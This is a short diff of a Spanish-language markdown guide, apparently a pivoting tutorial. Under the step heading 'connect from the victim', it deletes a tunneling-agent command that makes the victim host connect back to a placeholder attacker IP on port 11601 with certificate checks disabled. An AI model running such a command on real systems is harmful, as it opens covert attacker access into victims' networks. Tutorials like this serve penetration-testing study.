@@ -35,7 +35,7 @@ start            # start tunnel
 
 **Paso 2: Conectar desde la víctima**
 ```bash
-./agent -connect <TU_IP>:11601 -ignore-cert
+
 ```
 
 
